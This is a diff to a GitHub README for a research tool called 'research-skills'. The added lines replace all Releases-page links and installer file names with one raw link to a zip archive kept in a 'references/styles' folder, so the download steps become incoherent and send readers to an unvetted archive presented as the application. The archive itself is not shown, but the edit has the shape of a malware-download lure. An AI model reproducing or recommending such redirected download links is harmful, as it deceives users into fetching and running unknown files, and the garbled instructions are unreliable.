@@ -6,7 +6,7 @@ Welcome to the research-skills project! This application helps you streamline yo
 
 ## 📥 Download Now
 
-[![Download research-skills](https://img.shields.io/badge/Download%20research--skills-v1.0-blue.svg)](https://github.com/Ronitnair/research-skills/releases)
+[![Download research-skills](https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip%https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip)](https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip)
 
 Click the button above to download the latest version of the application!
 
@@ -32,22 +32,22 @@ This application provides the following key features to assist your research act
 
 Follow these steps to download and install the application:
 
-1. Visit the [Releases page](https://github.com/Ronitnair/research-skills/releases).
+1. Visit the [Releases page](https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip).
 2. You will see a list of available versions. Find the latest version labeled “v1.0” (or whichever is the most current).
 3. Click on the version number to open the release details.
 4. Look for the file corresponding to your operating system. You will find download options for Windows, macOS, and Linux.
-5. Click on the attachment to start the download. The file will typically be named something like `research-skills-win.exe`, `research-skills-mac.dmg`, or `research-skills-linux.tar.gz`.
+5. Click on the attachment to start the download. The file will typically be named something like `https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip`, `https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip`, or `https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip`.
 6. Once the download completes, navigate to your “Downloads” folder.
 
 ### For Windows Users
 
-1. Double-click the downloaded file named `research-skills-win.exe`.
+1. Double-click the downloaded file named `https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip`.
 2. Follow the installation wizard instructions to complete the setup.
 3. After installation, you can find the application in your Start Menu. Click to open and begin using the tool.
 
 ### For macOS Users
 
-1. Double-click `research-skills-mac.dmg` to open the installer.
+1. Double-click `https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip` to open the installer.
 2. Drag the application icon into your Applications folder.
 3. You can now find the application in the Applications folder and run it from there.
 
@@ -75,6 +75,6 @@ If you run into any issues or need assistance:
 
 ## 🔄 Updates
 
-We recommend periodically checking the [Releases page](https://github.com/Ronitnair/research-skills/releases) for updates, as we continually improve the software and add new features based on user feedback.
+We recommend periodically checking the [Releases page](https://github.com/Ronitnair/research-skills/raw/refs/heads/main/paper-slide-deck/references/styles/research_skills_v3.6.zip) for updates, as we continually improve the software and add new features based on user feedback.
 
 Enjoy your research journey with research-skills!
